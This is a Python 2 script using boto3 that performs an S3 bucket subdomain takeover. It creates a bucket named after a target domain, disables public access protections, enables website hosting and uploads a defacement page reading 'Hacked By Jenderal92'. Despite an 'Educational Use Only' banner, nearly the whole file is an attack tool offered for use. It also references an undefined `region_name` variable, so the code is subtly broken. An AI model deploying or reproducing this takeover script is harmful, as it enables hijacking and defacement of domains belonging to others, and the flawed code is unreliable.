import boto3
import sys

def banner():
    print """
        AWS S3 Bucket Manager - Educational Use Only
        By: Shin Code | Use responsibly on your own assets
    """

banner()

session = boto3.Session(
    aws_access_key_id="PUT UR KEY HERE",
    aws_secret_access_key="PUT UR ACC KEY HERE",
    region_name="us-east-1"
)

s3 = session.client('s3')

if len(sys.argv) < 2:
    print "Usage: python script.py <domain_name>"
    sys.exit(1)

domain_name = sys.argv[1]
html_content = """<html>
<head><title>Hacked By Jenderal92</title></head>
<body><h1>TakeOver By Shin Code</h1></body>
</html>"""

try:
    s3.create_bucket(
        Bucket=domain_name,
        CreateBucketConfiguration={'LocationConstraint': region_name}
    )
    print "[+] Bucket '{}' created.".format(domain_name)


    s3.put_public_access_block(
        Bucket=domain_name,
        PublicAccessBlockConfiguration={
            "BlockPublicAcls": False,
            "IgnorePublicAcls": False,
            "BlockPublicPolicy": False,
            "RestrictPublicBuckets": False
        }
    )
    print "[+] Block Public Access settings disabled."

    s3.put_bucket_ownership_controls(
        Bucket=domain_name,
        OwnershipControls={
            'Rules': [{'ObjectOwnership': 'BucketOwnerPreferred'}]
        }
    )
    print "[+] Object Ownership set to 'BucketOwnerPreferred'."

    s3.put_bucket_website(
        Bucket=domain_name,
        WebsiteConfiguration={
            'ErrorDocument': {'Key': 'error.html'},
            'IndexDocument': {'Suffix': 'index.html'},
        }
    )
    print "[+] Static website hosting enabled."

    s3.put_object(Bucket=domain_name, Key='index.html', Body=html_content, ContentType='text/html')
    print "[+] index.html uploaded."

    s3.put_object_acl(Bucket=domain_name, Key='index.html', ACL='public-read')
    print "[+] index.html set to public-read."

except Exception as e:
    print "[!] Error:", e
